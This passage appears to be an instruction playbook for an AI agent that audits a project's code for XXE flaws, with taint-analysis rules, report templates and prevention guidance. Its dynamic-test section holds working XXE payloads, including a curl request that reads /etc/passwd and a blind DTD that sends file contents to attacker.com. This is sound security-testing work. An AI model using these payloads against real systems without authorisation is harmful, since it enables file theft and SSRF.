> 3. **Second-order input** — the XML content was stored (e.g., in the DB or filesystem) from a prior user-controlled upload or input, and is now being parsed:
>    - Find where the stored content was originally written — was it user-supplied at that point?
>    - Was it validated or sanitized at write time?
>
> 4. **Server-side / hardcoded source** — the XML comes from a bundled resource, config file loaded at startup, or server-generated content with no user influence — this site is NOT exploitable as XXE from user input.
>
> **For each parsing site, also assess exploitability**:
> - Is the response returned to the caller? (Reflected XXE — attacker can read file contents directly)
> - Is the response not returned, but side effects are observable? (Blind XXE — exfiltration via DNS/HTTP OOB or error messages)
> - Is the application behind authentication? (Reduces severity but does not eliminate the vulnerability)
> - Is the parser used in a context where only specific XML schemas are accepted? (e.g., SOAP envelope validation — still exploitable if DTD processing is on)
>
> **Vulnerable vs. Secure examples for this project's tech stack**:
>
> [TECH-STACK EXAMPLES]
>
> **Classification**:
> - **Vulnerable**: User input demonstrably reaches the XML parser and the parser has no external entity hardening. Response or out-of-band channel allows exfiltration.
> - **Likely Vulnerable**: User input probably reaches the parser (indirect flow), or the parser is unhardened but the exploitation path is partially obscured.
> - **Not Vulnerable**: The XML source is fully server-controlled, OR the parser has proper hardening in place (DTD disabled, external entities disabled).
> - **Needs Manual Review**: Cannot determine the input source with confidence, or the hardening configuration is complex and requires runtime verification.
>
> **Output format** — write to `{{ REPORTS_ROOT }}/07_batch_[N].md`:
>
> ```markdown
> # XXE Batch [N] Results
>
> ## Findings
>
> ### [VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [function name or route]
> - **Issue**: [e.g., "HTTP request body flows directly into lxml etree.fromstring without resolve_entities=False"]
> - **Taint trace**: [Step-by-step from entry point to the parsing call — e.g., "request.body → xml_data → etree.fromstring(xml_data)"]
> - **Parser**: [library and version if known]
> - **Exploitability**: [Reflected / Blind OOB / Error-based / DoS only — describe what the attacker can achieve]
> - **Impact**: [e.g., "Read arbitrary local files via file:// entity", "SSRF to internal services via http:// entity", "DoS via entity expansion"]
> - **Remediation**: [Specific fix — e.g., "Use defusedxml", "Set resolve_entities=False and no_network=True", "Set disallow-doctype-decl feature to true"]
> - **Dynamic Test**:
>   ```
>   [curl command or payload to confirm the finding.
>    Show the exact endpoint, Content-Type header, and XXE payload.
>    Example:
>    curl -X POST https://app.example.com/api/import \
>      -H "Content-Type: application/xml" \
>      -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
>    Look for /etc/passwd content in the response body.]
>   ```
>
> ### [LIKELY VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Issue**: [e.g., "XML source likely comes from user-uploaded file via helper function" or "Parser unhardened but input path partially unclear"]
> - **Taint trace**: [Best-effort trace with the uncertain step identified]
> - **Concern**: [Why it's still a risk despite uncertainty]
> - **Remediation**: [Apply appropriate parser hardening]
> - **Dynamic Test**:
>   ```
>   [payload to attempt]
>   ```
>
> ### [NOT VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Reason**: [e.g., "XML is read from a bundled config file at startup with no user influence" or "defusedxml is used as the parser"]
>
> ### [NEEDS MANUAL REVIEW] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Uncertainty**: [Why the input source or parser configuration could not be determined]
> - **Suggestion**: [What to trace manually — e.g., "Follow `load_document()` in xml_utils.py to confirm whether its argument comes from a user request"]
> ```

### Phase 3: Merge — Consolidate Batch Results

After **all** Phase 2 batch subagents complete, read every `{{ REPORTS_ROOT }}/07_batch_*.md` file and merge them into a single `{{ REPORTS_ROOT }}/07_xxe.md`. You (the orchestrator) do this directly — no subagent needed.

**Merge procedure**:

1. Read all `{{ REPORTS_ROOT }}/07_batch_1.md`, `{{ REPORTS_ROOT }}/07_batch_2.md`, ... files.
2. Collect all findings from each batch file and combine them into one list, preserving the original classification and all detail fields.
3. Count totals across all batches for the executive summary.
4. Write the merged report to `{{ REPORTS_ROOT }}/07_xxe.md` using this format:

```markdown
# XXE Analysis Results: [Project Name]

## Executive Summary
- Parsing sites analyzed: [total across all batches]
- Vulnerable: [N]
- Likely Vulnerable: [N]
- Not Vulnerable: [N]
- Needs Manual Review: [N]

## Findings

[All findings from all batches, grouped by classification:
 VULNERABLE first, then LIKELY VULNERABLE, then NEEDS MANUAL REVIEW, then NOT VULNERABLE.
 Preserve every field from the batch results exactly as written.]
```

5. After writing `{{ REPORTS_ROOT }}/07_xxe.md`, **delete all intermediate files**: `{{ REPORTS_ROOT }}/07_recon.md` and `{{ REPORTS_ROOT }}/07_batch_*.md`.

***

## OWASP API Security Top 10 2023 mapping
[ref: #xxe-owasp-mapping]

This scan supports the following OWASP API Security Top 10 2023 risks:

| Root cause | OWASP risk | When to cross-map |
| --- | --- | --- |
| XML parser configured to resolve external entities | **API8:2023 Security Misconfiguration** | Default parser settings allow DTDs/entities; missing hardening. |
| XML received from a third-party API is parsed without disabling entities | **API10:2023 Unsafe Consumption of APIs** | Upstream XML is trusted and passed to a vulnerable parser. |
| File upload of SVG/office documents parsed with a vulnerable XML library | **API8 / API10** | Upload processing uses XML-based formats without hardening. |

- **API8:2023 Security Misconfiguration** — XML parsers are left with default settings that allow DTD processing and external entity resolution.
- **API10:2023 Unsafe Consumption of APIs** — User-supplied or third-party XML documents are parsed without disabling external entities or validating the source.

***

## Prevention Guidance
[ref: #xxe-prevention-guidance]

Apply the OWASP XXE Prevention Cheat Sheet, adapted for APIs:

1. **Prefer JSON or other non-XML formats** when the business requirement allows it. Removing XML from the attack surface eliminates XXE entirely.
2. **Upgrade and patch all XML processors and libraries** in use. Vulnerabilities in underlying parsers (libxml2, Xerces, expat) are regularly discovered and patched — e.g., the libxml2 SAX parser could emit external-entity events even when a custom handler set the `checked` flag (CVE-2024-40896), and expat needed input-validation fixes up to 2.6.3 (CVE-2024-45490).
3. **Disable XML external entity and DTD processing** in every parser configuration. Do not rely on defaults.
4. **Implement positive server-side input validation**, filtering, or sanitization before parsing. Reject unexpected `DOCTYPE` declarations, DTDs, or `xi:include` elements when possible.
5. **Verify that XSD validation does not enable entity resolution**. Schema validation can re-enable DTD processing; ensure validators run with the same hardening flags as the parser.
6. **Limit outbound connectivity from XML-processing services**. Use firewall rules, egress proxies, or network policies so that a compromised parser cannot reach internal infrastructure or attacker servers.
7. **Log XML parsing errors without returning file contents to clients**. Verbose error messages can turn a blind XXE into an error-based data exfiltration channel.

***

## Dynamic Test Payloads
[ref: #xxe-dynamic-payloads]

Use these payloads during manual verification or to illustrate exploitability in findings.

### In-band / reflected XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

Send with:

```bash
curl -X POST https://app.example.com/api/import \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```

### Literal `SYSTEM "http://attacker.com"` PoC

Use an HTTP-based entity to prove SSRF through XXE without relying on local files:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe-ping">
]>
<foo>&xxe;</foo>
```

If the parser resolves the entity, an outbound HTTP request appears in the attacker server logs, confirming both SSRF and XXE.

### Error-based XXE

Force a parser error that includes expanded entity content or file path information:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo><bar>&xxe;</bar></foo>
```

Look for file content, partial paths, or entity expansion failures in the HTTP response or application logs.

### Blind / OOB XXE

Host the following DTD on `http://attacker.com/evil.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
```

Then send:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>bar</foo>
```

The parser fetches `evil.dtd`, reads `/etc/passwd`, and issues an HTTP request to `http://attacker.com/?x=<file contents>`.

***

## Important Reminders
[ref: #xxe-important-reminders]

- Read `{{ REPORTS_ROOT }}/01_architecture.md` and pass its content to all subagents as context.
- **Subagents MUST NOT modify project source code.** They may only read code and write report files.
- Phase 2 must run AFTER Phase 1 completes — it depends on the recon output.
- Phase 3 must run AFTER all Phase 2 batches complete — it depends on all batch outputs.
- Batch size is **3 parsing sites per subagent**. If there are 1-3 sites total, use a single subagent. If there are 10, use 4 subagents (3+3+3+1).
- Launch all batch subagents **in parallel** — do not run them sequentially.
- Each batch subagent receives only its assigned sites' text from the recon file, not the entire recon file. This keeps each subagent's context small and focused.
- **Phase 1 is purely structural**: flag any XML parsing call that lacks explicit external entity hardening, regardless of where the input comes from. Do not attempt to trace user input in Phase 1 — that is Phase 2's job.
- **Phase 2 is purely taint analysis**: for each site found in Phase 1, trace the XML input back to its origin. If it comes from a user-controlled source, the site is a real vulnerability.
- **Parser defaults matter**: Java DOM/SAX, PHP SimpleXML/DOMDocument, and lxml all resolve external entities by default — they require explicit hardening. Python's `defusedxml` and Go's `encoding/xml` are safe by default.
- **Do not confuse `LIBXML_NOENT` with protection**: in PHP, `LIBXML_NOENT` **expands** entities into their values — it does NOT disable entity loading. Only `libxml_disable_entity_loader(true)` (PHP 7.x; deprecated in PHP 8.0) or `LIBXML_NONET` provides network-entity protection; on PHP 8.0+ external entity loading is off by default unless `LIBXML_NOENT` or a custom loader opts back in.
- **XInclude is a separate vector**: if `XIncludeAware` processing is enabled on Java parsers or `xi:include` is processed elsewhere, flag it separately — it can read local files without a classic `ENTITY` declaration.
- When in doubt, classify as "Needs Manual Review" rather than "Not Vulnerable". False negatives are worse than false positives in security assessment.
- Taint can flow indirectly: a file upload may be saved to disk in one handler, then parsed in another background job. Trace the full chain including asynchronous processing paths.
- Error-based XXE can leak data through verbose parser errors. Do not dismiss a finding just because the response does not echo the entity directly.
- Blind XXE (no output in response) is still exploitable via DNS or HTTP callbacks to attacker-controlled servers. Do not dismiss a finding just because the parsed XML is not echoed back.
- Clean up intermediate files: after the final `{{ REPORTS_ROOT }}/07_xxe.md` is written, ensure `{{ REPORTS_ROOT }}/07_recon.md` and all `{{ REPORTS_ROOT }}/07_batch_*.md` files are deleted (on the zero-findings early exit, only `{{ REPORTS_ROOT }}/07_recon.md` is deleted).
